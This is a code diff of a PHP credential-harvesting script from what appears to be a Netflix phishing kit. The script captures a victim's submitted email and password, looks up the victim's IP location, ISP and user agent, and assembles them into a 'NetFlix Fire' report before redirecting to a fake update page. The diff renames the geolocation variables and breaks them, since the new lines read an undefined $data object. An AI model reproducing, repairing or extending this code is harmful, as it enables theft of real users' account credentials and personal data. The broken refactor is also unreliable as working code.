@@ -36,24 +36,23 @@ $_SESSION['userLoignId'] = $_POST['userLoginId'];
 $_SESSION['password'] = $_POST['password'];
 
 $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
-$COUNTRY = $IP_LOOKUP->country . "\r\n";
-$countryCode = $IP_LOOKUP->countryCode. "\r\n";
-$regionName    = $IP_LOOKUP->regionName . "\r\n";
-$lat    = $IP_LOOKUP->lat . "\r\n";
-$timezone    = $IP_LOOKUP->timezone . "\r\n";
-$isp    = $IP_LOOKUP->isp . "\r\n";
-$as    = $IP_LOOKUP->as . "\r\n";
-$CITY    = $IP_LOOKUP->city . "\r\n";
-$REGION  = $IP_LOOKUP->region . "\r\n";
-$STATE   = $IP_LOOKUP->regionName . "\r\n";
-$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
+$country = $data->country ?? 'Unknown';
+$countryCode = $data->countryCode ?? 'Unknown';
+$regionName = $data->regionName ?? 'Unknown';
+$lat = $data->lat ?? '';
+$timezone = $data->timezone ?? '';
+$isp = $data->isp ?? '';
+$as = $data->as ?? '';
+$city = $data->city ?? '';
+$region = $data->region ?? '';
+$zip = $data->zip ?? '';
 
 
 $message = "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\r\n";
 $message .= "[+] Email : " .$_POST['userLoginId']."\r\n";
 $message .= "[+] Password : ".$_POST['password']."\r\n";
 $message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
-$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
+$message .= "[+] IP : " .$ip."\n[+] Country : ".$country."[+] City: " .$city."[+] Region : " .$region."[+] State: " .$regionName."[+] Zip : " .$zip."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
 $message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
 $message .= "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\n";
 
@@ -72,4 +71,5 @@ HEADER("Location: ../update.php");
 
 
 ?>
+
 
